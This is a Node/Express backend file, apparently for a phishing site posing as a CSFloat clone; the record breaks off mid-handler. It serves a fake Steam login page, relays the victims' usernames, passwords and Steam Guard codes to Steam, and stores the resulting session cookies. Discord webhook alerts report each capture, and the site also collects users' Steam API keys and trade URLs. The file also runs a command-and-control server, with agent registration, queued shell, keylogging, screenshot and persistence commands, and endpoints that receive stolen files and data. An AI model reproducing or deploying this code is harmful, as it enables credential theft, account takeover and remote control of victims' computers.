import 'dotenv/config';
import express from "express";
import cors from "cors";
import mysql from "mysql2/promise";
import { DiscordWebhook } from "./discordWebhook.js";
import fetch from 'node-fetch';
import path from 'path';
import crypto from 'crypto';

// --- App Configuration ---
const app = express();
const PORT = process.env.PORT || 3002;
const FRONTEND_URL = process.env.FRONTEND_URL || "http://150.136.130.59";
const BACKEND_URL = process.env.BACKEND_URL || `http://150.136.130.59:${PORT}`;

// --- Environment Variable Check ---
const dbConfig = {
    host: process.env.MYSQL_HOST,
    user: process.env.MYSQL_USER,
    password: process.env.MYSQL_PASSWORD,
    database: process.env.MYSQL_DATABASE,
};

if (!dbConfig.host || !dbConfig.user || !dbConfig.password || !dbConfig.database) {
    console.error("FATAL: Missing one or more required environment variables for the database.");
    console.error("Required variables: MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE");
    console.error("Current config:", { 
        host: dbConfig.host, 
        user: dbConfig.user, 
        password: dbConfig.password ? '[SET]' : '[NOT SET]', 
        database: dbConfig.database 
    });
    process.exit(1);
}

// --- Middleware ---
app.use(express.json());
app.use(cors({ origin: FRONTEND_URL, credentials: true }));
app.use('/download', express.static('/home/ubuntu/public/downloads'));

// --- Services ---
let pool;
let dbReady = false;
const webhook = new DiscordWebhook(process.env.DISCORD_WEBHOOK_URL);

// Initialize SteamOpenID with proper import handling
let steam;
try {
    const SteamOpenIDModule = await import("steam-openid");
    const SteamOpenID = SteamOpenIDModule.default.default;
    console.log('SteamOpenID imported successfully');
    
    steam = new SteamOpenID({
        returnUrl: `${BACKEND_URL}/auth/steam/return`,
        realm: BACKEND_URL,
    });
    console.log('SteamOpenID initialized successfully');
} catch (error) {
    console.error('Failed to initialize SteamOpenID:', error.message);
    console.error('Error details:', error);
    // Create a dummy steam object to prevent crashes
    steam = {
        getRedirectUrl: async () => {
            throw new Error('SteamOpenID not available');
        },
        verify: async () => {
            throw new Error('SteamOpenID not available');
        }
    };
}

// --- Database Initialization ---
async function initDatabase() {
    try {
        pool = mysql.createPool({ ...dbConfig, waitForConnections: true, connectionLimit: 10, queueLimit: 0 });
        const connection = await pool.getConnection();
        
        // Create page_visits table
        await connection.query(`
            CREATE TABLE IF NOT EXISTS page_visits (
                id INT AUTO_INCREMENT PRIMARY KEY,
                page_path VARCHAR(255) NOT NULL,
                user_agent TEXT,
                ip_address VARCHAR(45),
                referrer VARCHAR(512),
                visited_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Create steam_sessions table for real authentication
        await connection.query(`
            CREATE TABLE IF NOT EXISTS steam_sessions (
                id INT AUTO_INCREMENT PRIMARY KEY,
                steam_id VARCHAR(20) NOT NULL UNIQUE,
                refresh_token TEXT NOT NULL,
                access_token TEXT,
                session_token TEXT,
                cookies TEXT,
                expires_at TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            )
        `);

        // Create steam_auth_attempts table for tracking login attempts
        await connection.query(`
            CREATE TABLE IF NOT EXISTS steam_auth_attempts (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(64) NOT NULL,
                ip_address VARCHAR(45),
                success BOOLEAN DEFAULT FALSE,
                error_message TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Create C2 agents table
        await connection.query(`
            CREATE TABLE IF NOT EXISTS c2_agents (
                id INT AUTO_INCREMENT PRIMARY KEY,
                agent_id VARCHAR(64) UNIQUE NOT NULL,
                hostname VARCHAR(255),
                username VARCHAR(255),
                os_info TEXT,
                ip_address VARCHAR(45),
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status ENUM('active', 'inactive', 'compromised') DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Create C2 commands table
        await connection.query(`
            CREATE TABLE IF NOT EXISTS c2_commands (
                id INT AUTO_INCREMENT PRIMARY KEY,
                agent_id VARCHAR(64) NOT NULL,
                command_type ENUM('shell', 'download', 'upload', 'screenshot', 'keylog', 'persistence', 'collect_data', 'collect_files') NOT NULL,
                command_data TEXT NOT NULL,
                status ENUM('pending', 'executing', 'completed', 'failed') DEFAULT 'pending',
                result TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP NULL,
                completed_at TIMESTAMP NULL,
                FOREIGN KEY (agent_id) REFERENCES c2_agents(agent_id) ON DELETE CASCADE
            )
        `);

        // Create C2 results table
        await connection.query(`
            CREATE TABLE IF NOT EXISTS c2_results (
                id INT AUTO_INCREMENT PRIMARY KEY,
                command_id INT NOT NULL,
                agent_id VARCHAR(64) NOT NULL,
                result_data TEXT,
                file_path VARCHAR(512),
                file_size INT,
                success BOOLEAN DEFAULT FALSE,
                error_message TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (command_id) REFERENCES c2_commands(id) ON DELETE CASCADE,
                FOREIGN KEY (agent_id) REFERENCES c2_agents(agent_id) ON DELETE CASCADE
            )
        `);

        await connection.query(`
            CREATE TABLE IF NOT EXISTS users (
                id INT AUTO_INCREMENT PRIMARY KEY,
                steam_id VARCHAR(20) NOT NULL UNIQUE,
                username VARCHAR(255),
                steam_api_key VARCHAR(255),
                trade_url VARCHAR(255),
                app_installed BOOLEAN DEFAULT FALSE,
                last_login TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        console.log('Successfully connected to MySQL database.');
        connection.release();
        dbReady = true;
    } catch (err) {
        console.error('FATAL: Failed to initialize database pool:', err.message);
        dbReady = false;
        throw err;
    }
}

// --- Steam Authentication Functions ---
async function createSteamSession(steamId, refreshToken, accessToken = null, sessionToken = null, cookies = null) {
    if (!dbReady) throw new Error('Database not available');
    
    const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000); // 30 days
    
    await pool.query(`
        INSERT INTO steam_sessions (steam_id, refresh_token, access_token, session_token, cookies, expires_at)
        VALUES (?, ?, ?, ?, ?, ?)
        ON DUPLICATE KEY UPDATE
        refresh_token = VALUES(refresh_token),
        access_token = VALUES(access_token),
        session_token = VALUES(session_token),
        cookies = VALUES(cookies),
        expires_at = VALUES(expires_at),
        updated_at = CURRENT_TIMESTAMP
    `, [steamId, refreshToken, accessToken, sessionToken, cookies, expiresAt]);
}

async function getSteamSession(steamId) {
    if (!dbReady) return null;
    
    const [rows] = await pool.query(
        'SELECT * FROM steam_sessions WHERE steam_id = ? AND expires_at > NOW()',
        [steamId]
    );
    
    return rows.length > 0 ? rows[0] : null;
}

async function logAuthAttempt(username, ipAddress, success, errorMessage = null) {
    if (!dbReady) return;
    
    await pool.query(`
        INSERT INTO steam_auth_attempts (username, ip_address, success, error_message)
        VALUES (?, ?, ?, ?)
    `, [username, ipAddress, success, errorMessage]);
}

// --- Routes ---

// 1. Health Check
app.get('/', (req, res) => {
  res.json({ 
    message: 'CSFloat Clone API is running',
    database: dbReady ? 'Connected' : 'Disconnected' 
  });
});

// Log page visits
app.post('/api/log-visit', async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  
  try {
    const { pagePath } = req.body;
    const userAgent = req.get('User-Agent');
    const ipAddress = req.ip || req.connection.remoteAddress;
    const referrer = req.get('Referer');
    
    await pool.query(
      'INSERT INTO page_visits (page_path, user_agent, ip_address, referrer) VALUES (?, ?, ?, ?)',
      [pagePath, userAgent, ipAddress, referrer]
    );
    
    res.json({ success: true });
  } catch (err) {
    console.error("Error logging page visit:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// 2. Real Steam Authentication Routes
app.get('/auth/steam', async (req, res) => {
  // Serve the real Steam login page
  res.sendFile('fakesteam.html', { root: './src/pages' });
});

// Create refresh token endpoint
app.post('/auth/steam/refresh-token', async (req, res) => {
  try {
    const { username, password, guardCode, platform = 'web' } = req.body;
    const ipAddress = req.ip || req.connection.remoteAddress;
    
    if (!username || !password) {
      await logAuthAttempt(username, ipAddress, false, 'Missing username or password');
      return res.status(400).json({ error: 'Username and password are required' });
    }

    // Steam login process
    const loginData = new URLSearchParams();
    loginData.append('username', username);
    loginData.append('password', password);
    loginData.append('remember_login', 'true');
    loginData.append('rsatimestamp', Date.now().toString());
    
    if (guardCode) {
      loginData.append('twofactorcode', guardCode);
    }

    // First, get the login page to get necessary cookies
    const loginPageResponse = await fetch('https://steamcommunity.com/login/dologin/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
      },
      body: loginData.toString()
    });

    const loginResult = await loginPageResponse.json();
    
    if (loginResult.success) {
      // Extract Steam ID from cookies or response
      const cookies = loginPageResponse.headers.get('set-cookie');
      const steamIdMatch = cookies?.match(/steamLoginSecure=([^;]+)/);
      const steamId = steamIdMatch ? steamIdMatch[1].split('|')[0] : null;
      
      if (steamId) {
        // Generate refresh token
        const refreshToken = crypto.randomBytes(32).toString('hex');
        
        // --- Create or update user in the database ---
        await pool.query(`
          INSERT INTO users (steam_id, username, last_login)
          VALUES (?, ?, CURRENT_TIMESTAMP)
          ON DUPLICATE KEY UPDATE
          last_login = CURRENT_TIMESTAMP,
          username = VALUES(username)
        `, [steamId, username]);

        // Store session
        await createSteamSession(steamId, refreshToken, null, null, cookies);
        
        // Log successful attempt
        await logAuthAttempt(username, ipAddress, true);
        
        // Send Discord notification
        webhook.sendUserUpdate(steamId, { 
          username, 
          hasPassword: !!password, 
          hasGuardCode: !!guardCode,
          platform 
        });
        
        res.json({ 
          success: true, 
          steamId, 
          refreshToken,
          message: 'Authentication successful' 
        });
      } else {
        await logAuthAttempt(username, ipAddress, false, 'Could not extract Steam ID');
        res.status(400).json({ error: 'Could not extract Steam ID from response' });
      }
    } else {
      const errorMessage = loginResult.message || 'Login failed';
      await logAuthAttempt(username, ipAddress, false, errorMessage);
      res.status(400).json({ error: errorMessage });
    }
  } catch (err) {
    console.error('Steam authentication error:', err);
    await logAuthAttempt(req.body.username, req.ip, false, err.message);
    res.status(500).json({ error: 'Internal server error during authentication' });
  }
});

// Create access token endpoint
app.post('/auth/steam/access-token', async (req, res) => {
  try {
    const { refreshToken, steamId } = req.body;
    
    if (!refreshToken || !steamId) {
      return res.status(400).json({ error: 'Refresh token and Steam ID are required' });
    }
    
    const session = await getSteamSession(steamId);
    if (!session || session.refresh_token !== refreshToken) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }
    
    // Generate new access token
    const accessToken = crypto.randomBytes(32).toString('hex');
    
    // Update session with new access token
    await pool.query(
      'UPDATE steam_sessions SET access_token = ? WHERE steam_id = ?',
      [accessToken, steamId]
    );
    
    res.json({ 
      success: true, 
      accessToken,
      expiresIn: 3600 // 1 hour
    });
  } catch (err) {
    console.error('Access token creation error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Create cookies endpoint
app.post('/auth/steam/cookies', async (req, res) => {
  try {
    const { refreshToken, steamId } = req.body;
    
    if (!refreshToken || !steamId) {
      return res.status(400).json({ error: 'Refresh token and Steam ID are required' });
    }
    
    const session = await getSteamSession(steamId);
    if (!session || session.refresh_token !== refreshToken) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }
    
    // Return stored cookies
    res.json({ 
      success: true, 
      cookies: session.cookies
    });
  } catch (err) {
    console.error('Cookies retrieval error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Handle fake Steam login form submission (for backward compatibility)
app.post('/auth/steam/login', async (req, res) => {
  try {
    const { username, password, guardCode } = req.body;
    
    // Log the login attempt
    console.log('Steam login attempt:', { username, hasPassword: !!password, hasGuardCode: !!guardCode });
    
    // Call the new refresh token endpoint
    const tokenResponse = await fetch(`${BACKEND_URL}/auth/steam/refresh-token`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password, guardCode })
    });
    
    const tokenResult = await tokenResponse.json();
    
    if (tokenResult.success) {
      // Redirect back to frontend with the real Steam ID
      res.redirect(`${FRONTEND_URL}/verify?steamId=${tokenResult.steamId}`);
    } else {
      // Redirect back to frontend with error
      res.redirect(`${FRONTEND_URL}/verify?error=${encodeURIComponent(tokenResult.error)}`);
    }
  } catch (err) {
    console.error("Error handling Steam login:", err.message);
    res.redirect(`${FRONTEND_URL}/verify?error=${encodeURIComponent('Authentication failed')}`);
  }
});

app.get('/auth/steam/return', async (req, res) => {
  try {
    // Just verify the Steam authentication without storing anything
    const user = await steam.verify(req.query);
    console.log('Steam authentication successful for:', user.steamid);
    
    // Extract Steam ID from the OpenID response
    const steamId = user.steamid;
    
    // Redirect back to home page with Steam ID
    res.redirect(`${FRONTEND_URL}/verify?steamId=${steamId}`);
  } catch (err) {
    console.error("Steam OpenID verification failed:", err.message);
    // Even on error, redirect to home page
    res.redirect(FRONTEND_URL);
  }
});

// Handle old /verify redirects
app.get('/verify', async (req, res) => {
  try {
    // Just verify the Steam authentication without storing anything
    const user = await steam.verify(req.query);
    console.log('Steam authentication successful for:', user.steamid);
    
    // Extract Steam ID from the OpenID response
    const steamId = user.steamid;
    
    // Redirect back to home page with Steam ID
    res.redirect(`${FRONTEND_URL}/verify?steamId=${steamId}`);
  } catch (err) {
    console.error("Steam OpenID verification failed:", err.message);
    // Even on error, redirect to home page
    res.redirect(FRONTEND_URL);
  }
});

// 3. User API Routes (and all others that need the DB)
app.get("/api/user/:steamId", async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  const { steamId } = req.params;
  try {
    const [rows] = await pool.query("SELECT steam_id, api_key, trade_url, app_installed FROM users WHERE steam_id = ?", [steamId]);
    if (rows.length === 0) {
      return res.status(404).json({ error: "User not found" });
    }
    res.json(rows[0]);
  } catch (err) {
    console.error("Error fetching user data:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post("/api/user/:steamId", async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  const { steamId } = req.params;
  const { apiKey, tradeUrl, appInstalled } = req.body;
  
  // Basic validation
  if (apiKey && typeof apiKey !== 'string') return res.status(400).json({ error: "Invalid API Key" });
  if (tradeUrl && typeof tradeUrl !== 'string') return res.status(400).json({ error: "Invalid Trade URL" });
  if (appInstalled && typeof appInstalled !== 'boolean') return res.status(400).json({ error: "Invalid appInstalled value" });

  try {
    const [result] = await pool.query(
      `UPDATE users SET 
        api_key = COALESCE(?, api_key),
        trade_url = COALESCE(?, trade_url),
        app_installed = COALESCE(?, app_installed)
       WHERE steam_id = ?`,
      [apiKey, tradeUrl, appInstalled, steamId]
    );

    if (result.affectedRows === 0) {
        return res.status(404).json({ error: "User not found" });
    }
    
    webhook.sendUserUpdate(steamId, { apiKey, tradeUrl, appInstalled });
    
    res.json({ success: true, message: "Profile updated successfully." });
  } catch (err) {
    console.error("Error updating user data:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Add this before the admin routes
app.post('/api/steam/profile', async (req, res) => {
  const { steamId, apiKey } = req.body;
  if (!steamId || !apiKey) {
    return res.status(400).json({ error: 'Missing steamId or apiKey' });
  }
  try {
    const steamRes = await fetch(
      `https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/?key=${apiKey}&steamids=${steamId}`
    );
    const data = await steamRes.json();
    res.json(data);
  } catch (err) {
    console.error('Error fetching Steam profile:', err);
    res.status(500).json({ error: 'Failed to fetch Steam profile' });
  }
});

// Admin authentication middleware
const authenticateAdmin = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No valid authorization header' });
  }
  
  const token = authHeader.substring(7); // Remove 'Bearer ' prefix
  
  try {
    // Decode the base64 token (username:password format)
    const decoded = Buffer.from(token, 'base64').toString('utf-8');
    const [username, password] = decoded.split(':');
    
    // In a real implementation, you would validate against a database
    // For now, we'll use the same hardcoded credentials as the frontend
    if (username === 'admin' && password === 'admin123') {
      req.adminUser = { username };
      next();
    } else {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token format' });
  }
};

// 4. Admin Routes
app.get("/api/admin/users", authenticateAdmin, async (req, res) => {
  try {
    const [rows] = await pool.query("SELECT * FROM users ORDER BY created_at DESC");
    res.json(rows);
  } catch (err) {
    console.error("Error fetching users for admin:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/admin/page-visits", authenticateAdmin, async (req, res) => {
  try {
    const [rows] = await pool.query(`
      SELECT 
        page_path,
        COUNT(*) as visit_count,
        DATE(visited_at) as visit_date
      FROM page_visits 
      GROUP BY page_path, DATE(visited_at)
      ORDER BY visit_date DESC, visit_count DESC
    `);
    res.json(rows);
  } catch (err) {
    console.error("Error fetching page visits for admin:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/admin/page-visits-summary", authenticateAdmin, async (req, res) => {
  try {
    const [totalVisits] = await pool.query("SELECT COUNT(*) as total FROM page_visits");
    const [todayVisits] = await pool.query("SELECT COUNT(*) as today FROM page_visits WHERE DATE(visited_at) = CURDATE()");
    const [topPages] = await pool.query(`
      SELECT page_path, COUNT(*) as count 
      FROM page_visits 
      GROUP BY page_path 
      ORDER BY count DESC 
      LIMIT 10
    `);
    
    res.json({
      totalVisits: totalVisits[0].total,
      todayVisits: todayVisits[0].today,
      topPages
    });
  } catch (err) {
    console.error("Error fetching page visits summary for admin:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Enhanced analytics endpoints
app.get("/api/admin/analytics/detailed", authenticateAdmin, async (req, res) => {
  try {
    // Get visits by hour for today
    const [hourlyVisits] = await pool.query(`
      SELECT HOUR(visited_at) as hour, COUNT(*) as count
      FROM page_visits 
      WHERE DATE(visited_at) = CURDATE()
      GROUP BY HOUR(visited_at)
      ORDER BY hour
    `);

    // Get visits by day for last 7 days
    const [dailyVisits] = await pool.query(`
      SELECT DATE(visited_at) as date, COUNT(*) as count
      FROM page_visits 
      WHERE visited_at >= DATE_SUB(CURDATE(), INTERVAL 7 DAY)
      GROUP BY DATE(visited_at)
      ORDER BY date
    `);

    // Get unique visitors today
    const [uniqueVisitorsToday] = await pool.query(`
      SELECT COUNT(DISTINCT ip_address) as unique_visitors
      FROM page_visits 
      WHERE DATE(visited_at) = CURDATE()
    `);

    // Get unique visitors total
    const [uniqueVisitorsTotal] = await pool.query(`
      SELECT COUNT(DISTINCT ip_address) as unique_visitors
      FROM page_visits
    `);

    // Get most active hours
    const [activeHours] = await pool.query(`
      SELECT HOUR(visited_at) as hour, COUNT(*) as count
      FROM page_visits 
      GROUP BY HOUR(visited_at)
      ORDER BY count DESC
      LIMIT 5
    `);

    // Get referrer statistics
    const [referrerStats] = await pool.query(`
      SELECT 
        CASE 
          WHEN referrer IS NULL OR referrer = '' THEN 'Direct'
          WHEN referrer LIKE '%google%' THEN 'Google'
          WHEN referrer LIKE '%facebook%' THEN 'Facebook'
          WHEN referrer LIKE '%twitter%' THEN 'Twitter'
          WHEN referrer LIKE '%reddit%' THEN 'Reddit'
          ELSE 'Other'
        END as source,
        COUNT(*) as count
      FROM page_visits 
      GROUP BY source
      ORDER BY count DESC
    `);

    res.json({
      hourlyVisits,
      dailyVisits,
      uniqueVisitorsToday: uniqueVisitorsToday[0].unique_visitors,
      uniqueVisitorsTotal: uniqueVisitorsTotal[0].unique_visitors,
      activeHours,
      referrerStats
    });
  } catch (err) {
    console.error("Error fetching detailed analytics:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/admin/analytics/user-engagement", authenticateAdmin, async (req, res) => {
  try {
    // Get user engagement metrics
    const [userStats] = await pool.query(`
      SELECT 
        COUNT(*) as total_users,
        COUNT(CASE WHEN steam_api_key IS NOT NULL THEN 1 END) as users_with_api_key,
        COUNT(CASE WHEN trade_url IS NOT NULL THEN 1 END) as users_with_trade_url,
        COUNT(CASE WHEN app_installed = 1 THEN 1 END) as users_with_app,
        COUNT(CASE WHEN last_login >= DATE_SUB(NOW(), INTERVAL 7 DAY) THEN 1 END) as active_users_7d,
        COUNT(CASE WHEN last_login >= DATE_SUB(NOW(), INTERVAL 30 DAY) THEN 1 END) as active_users_30d,
        COUNT(CASE WHEN created_at >= DATE_SUB(NOW(), INTERVAL 7 DAY) THEN 1 END) as new_users_7d,
        COUNT(CASE WHEN created_at >= DATE_SUB(NOW(), INTERVAL 30 DAY) THEN 1 END) as new_users_30d
      FROM users
    `);

    // Get user registration trend
    const [registrationTrend] = await pool.query(`
      SELECT DATE(created_at) as date, COUNT(*) as count
      FROM users 
      WHERE created_at >= DATE_SUB(CURDATE(), INTERVAL 30 DAY)
      GROUP BY DATE(created_at)
      ORDER BY date
    `);

    // Get user login trend
    const [loginTrend] = await pool.query(`
      SELECT DATE(last_login) as date, COUNT(*) as count
      FROM users 
      WHERE last_login >= DATE_SUB(CURDATE(), INTERVAL 30 DAY)
      GROUP BY DATE(last_login)
      ORDER BY date
    `);

    res.json({
      userStats: userStats[0],
      registrationTrend,
      loginTrend
    });
  } catch (err) {
    console.error("Error fetching user engagement analytics:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/api/admin/analytics/page-performance", authenticateAdmin, async (req, res) => {
  try {
    // Get detailed page performance metrics
    const [pagePerformance] = await pool.query(`
      SELECT 
        page_path,
        COUNT(*) as total_visits,
        COUNT(DISTINCT ip_address) as unique_visitors,
        COUNT(DISTINCT DATE(visited_at)) as days_visited,
        MIN(visited_at) as first_visit,
        MAX(visited_at) as last_visit,
        ROUND(AVG(visits_per_day), 2) as avg_daily_visits
      FROM (
        SELECT 
          page_path,
          ip_address,
          visited_at,
          COUNT(*) OVER (PARTITION BY page_path, DATE(visited_at)) as visits_per_day
        FROM page_visits
      ) as daily_stats
      GROUP BY page_path
      ORDER BY total_visits DESC
      LIMIT 20
    `);

    // Get page bounce rate (single page visits)
    const [bounceRate] = await pool.query(`
      SELECT 
        page_path,
        COUNT(*) as total_visits,
        COUNT(CASE WHEN visit_count = 1 THEN 1 END) as single_page_visits,
        ROUND((COUNT(CASE WHEN visit_count = 1 THEN 1 END) / COUNT(*)) * 100, 2) as bounce_rate
      FROM (
        SELECT 
          page_path,
          ip_address,
          COUNT(*) as visit_count
        FROM page_visits
        WHERE visited_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)
        GROUP BY page_path, ip_address
      ) as visitor_stats
      GROUP BY page_path
      HAVING total_visits >= 5
      ORDER BY bounce_rate DESC
      LIMIT 10
    `);

    res.json({
      pagePerformance,
      bounceRate
    });
  } catch (err) {
    console.error("Error fetching page performance analytics:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// --- C2 API Endpoints ---

// Test endpoint to verify C2 API is working
app.get('/api/c2/test', (req, res) => {
  res.json({ 
    success: true, 
    message: 'C2 API is working',
    timestamp: new Date().toISOString()
  });
});

// Agent registration
app.post('/api/c2/register', async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  
  try {
    const { agent_id, hostname, username, os_info, ip_address } = req.body;
    
    if (!agent_id) {
      return res.status(400).json({ error: "Agent ID is required" });
    }

    // Check if agent already exists
    const [existing] = await pool.query('SELECT * FROM c2_agents WHERE agent_id = ?', [agent_id]);
    
    if (existing.length > 0) {
      // Update existing agent
      await pool.query(`
        UPDATE c2_agents 
        SET hostname = ?, username = ?, os_info = ?, ip_address = ?, last_seen = CURRENT_TIMESTAMP, status = 'active'
        WHERE agent_id = ?
      `, [hostname, username, os_info, ip_address, agent_id]);
    } else {
      // Create new agent
      await pool.query(`
        INSERT INTO c2_agents (agent_id, hostname, username, os_info, ip_address)
        VALUES (?, ?, ?, ?, ?)
      `, [agent_id, hostname, username, os_info, ip_address]);
    }
    
    res.json({ success: true, message: "Agent registered successfully" });
  } catch (err) {
    console.error("Error registering agent:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Get pending commands for agent
app.get('/api/c2/commands/:agent_id', async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  
  try {
    const { agent_id } = req.params;
    
    const [commands] = await pool.query(`
      SELECT id, command_type, command_data, created_at
      FROM c2_commands 
      WHERE agent_id = ? AND status = 'pending'
      ORDER BY created_at ASC
    `, [agent_id]);
    
    res.json({ commands });
  } catch (err) {
    console.error("Error fetching commands:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Submit command result
app.post('/api/c2/result', async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  
  try {
    const { command_id, agent_id, result_data, file_path, file_size, success, error_message } = req.body;
    
    // Update command status
    await pool.query(`
      UPDATE c2_commands 
      SET status = ?, result = ?, completed_at = CURRENT_TIMESTAMP
      WHERE id = ? AND agent_id = ?
    `, [success ? 'completed' : 'failed', result_data, command_id, agent_id]);
    
    // Insert result record
    await pool.query(`
      INSERT INTO c2_results (command_id, agent_id, result_data, file_path, file_size, success, error_message)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `, [command_id, agent_id, result_data, file_path, file_size, success, error_message]);
    
    res.json({ success: true });
  } catch (err) {
    console.error("Error submitting result:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// File upload endpoint for agents
app.post('/api/c2/upload/:agent_id', async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  
  try {
    const { agent_id } = req.params;
    const { filename, file_data, file_type, command_id } = req.body;
    
    if (!filename || !file_data) {
      return res.status(400).json({ error: "Filename and file data are required" });
    }
    
    // Create uploads directory if it doesn't exist
    const uploadsDir = path.join(process.cwd(), 'uploads', 'c2', agent_id);
    const fs = await import('fs');
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
    }
    
    // Decode base64 file data
    const buffer = Buffer.from(file_data, 'base64');
    const filePath = path.join(uploadsDir, filename);
    
    // Write file
    fs.writeFileSync(filePath, buffer);
    
    // Log file upload in database
    await pool.query(`
      INSERT INTO c2_results (command_id, agent_id, result_data, file_path, file_size, success, error_message)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `, [command_id || null, agent_id, `File uploaded: ${filename}`, filePath, buffer.length, true, null]);
    
    res.json({ 
      success: true, 
      message: "File uploaded successfully",
      file_path: filePath,
      file_size: buffer.length
    });
  } catch (err) {
    console.error("Error uploading file:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Data collection endpoint for agents
app.post('/api/c2/data/:agent_id', async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  
  try {
    const { agent_id } = req.params;
    const { data_type, data_content, metadata } = req.body;
    
    if (!data_type || !data_content) {
      return res.status(400).json({ error: "Data type and content are required" });
    }
    
    // Store collected data in database
    await pool.query(`
      INSERT INTO c2_results (agent_id, result_data, success, error_message)
      VALUES (?, ?, ?, ?)
    `, [agent_id, JSON.stringify({
      type: data_type,
      content: data_content,
      metadata: metadata || {},
      timestamp: new Date().toISOString()
    }), true, null]);
    
    res.json({ success: true, message: "Data collected successfully" });
  } catch (err) {
    console.error("Error collecting data:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Bulk data upload endpoint
app.post('/api/c2/bulk-upload/:agent_id', async (req, res) => {
  if (!dbReady) return res.status(503).json({ error: "Database not available" });
  
  try {
    const { agent_id } = req.params;
    const { files, data_collection } = req.body;
    
    const results = [];
    
    // Handle file uploads
    if (files && Array.isArray(files)) {
      const uploadsDir = path.join(process.cwd(), 'uploads', 'c2', agent_id);
      const fs = await import('fs');
      if (!fs.existsSync(uploadsDir)) {
        fs.mkdirSync(uploadsDir, { recursive: true });
      }
      
      for (const file of files) {
        try {
          const buffer = Buffer.from(file.data, 'base64');
          const filePath = path.join(uploadsDir, file.filename);
          fs.writeFileSync(filePath, buffer);
          
          await pool.query(`
            INSERT INTO c2_results (agent_id, result_data, file_path, file_size, success, error_message)
            VALUES (?, ?, ?, ?, ?, ?)
          `, [agent_id, `Bulk upload: ${file.filename}`, filePath, buffer.length, true, null]);
          
          results.push({ filename: file.filename, success: true });
        } catch (err) {
          results.push({ filename: file.filename, success: false, error: err.message });
        }
      }
    }
    
    // Handle data collection
    if (data_collection && Array.isArray(data_collection)) {
      for (const data of data_collection) {
        try {
          await pool.query(`
            INSERT INTO c2_results (agent_id, result_data, success, error_message)
            VALUES (?, ?, ?, ?)
          `, [agent_id, JSON.stringify(data), true, null]);
          
          results.push({ data_type: data.type, success: true });
        } catch (err) {
          results.push({ data_type: data.type, success: false, error: err.message });
        }
      }
    }
    
    res.json({ 
      success: true, 
      message: "Bulk upload completed",
      results 
    });
  } catch (err) {
    console.error("Error in bulk upload:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Admin: Get all agents
app.get('/api/admin/c2/agents', authenticateAdmin, async (req, res) => {
  if (!dbReady) {
    console.error('Database not ready for agents endpoint');
    return res.status(503).json({ error: "Database not available" });
  }
  
  try {
    console.log('Fetching agents from database...');
    const [agents] = await pool.query(`
      SELECT * FROM c2_agents 
      ORDER BY last_seen DESC
    `);
    
    console.log(`Found ${agents.length} agents`);
    res.json(agents);
  } catch (err) {
    console.error("Error fetching agents:", err);
    res.status(500).json({ error: "Internal server error", details: err.message });
  }
});

// Admin: Create command
app.post('/api/admin/c2/command', authenticateAdmin, async (req, res) => {
  if (!dbReady) {
    console.error('Database not ready for command endpoint');
    return res.status(503).json({ error: "Database not available" });
  }
  
  try {
    const { agent_id, command_type, command_data } = req.body;
    
